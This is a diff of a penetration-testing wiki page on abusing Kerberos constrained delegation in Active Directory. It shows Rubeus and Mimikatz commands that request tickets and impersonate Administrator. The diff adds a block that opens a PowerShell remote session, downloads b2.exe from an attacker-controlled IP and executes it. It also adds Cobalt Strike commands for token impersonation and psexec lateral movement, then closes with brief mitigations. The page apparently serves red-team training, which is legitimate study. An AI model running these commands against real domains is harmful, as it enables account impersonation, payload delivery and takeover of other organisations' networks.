@@ -1,5 +1,7 @@
 # Constrained Delegation
 
+##
+
 ## Constrained Delegation
 
 Using this a Domain admin can allow 3rd parties to impersonate a user or computer against a service of a machine.
@@ -31,7 +33,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 ```
 {% endcode %}
 
-{% code title="Using Rubeus" %}
+{% code title="Using Rubeus " %}
 ```bash
 #Obtain a TGT for the Constained allowed user
 .\Rubeus.exe asktgt /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
@@ -42,9 +44,29 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 #Impersonate Administrator on different service (HOST)
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST
 #Load ticket in memory
-.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
+.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp
 ```
 {% endcode %}
+
+{% code title="Other Method (Rubeus)" %}
+```
+Rubeus.exe tgtdeleg 
+.\Rubeus.exe s4u
+/ticket:<ticket> impersonateuser:Micheal.Crosley /domain:m3c.local /msdsspn:"time/m3webaw" /altservice:http /ptt 
+
+$session = new-pssession -computername m3webaw
+invoke-command $session {powershell -NoP -NonI -c Invoke-WebRequest -Uri 'http://10.10.14.177:80/b2.exe' -OutFile 'c:\\Windows\\Temp\\b2.exe'}
+invoke-command $session {cd 'c:\\Windows\\Temp'; .\b2.exe}
+```
+{% endcode %}
+
+<pre><code><strong>Cobalt
+</strong><strong>shell .\Rubeus.exe asktgt /user:svc_test /aes256:13bbd393caefb2a65419ff6be4cd0e192ecef1a497e23798c1e8e8ac381c14e7 /opsec /nowrap
+</strong>shell .\Rubeus.exe s4u /impersonateuser:c.boyd /nowrap /msdsspn:cifs/srv.child.rto.local /user:svc_test /ticket:
+make_token child.rto.local\c.boyd 1111
+jump psexec srv.child.rto.local beacon_smb</code></pre>
+
+
 
 ### Mitigation
 
@@ -52,4 +74,4 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 * Limit DA/Admin logins to specific services
 * Set "Account is sensitive and cannot be delegated" for privileged accounts.
 
-****[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)****
+[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
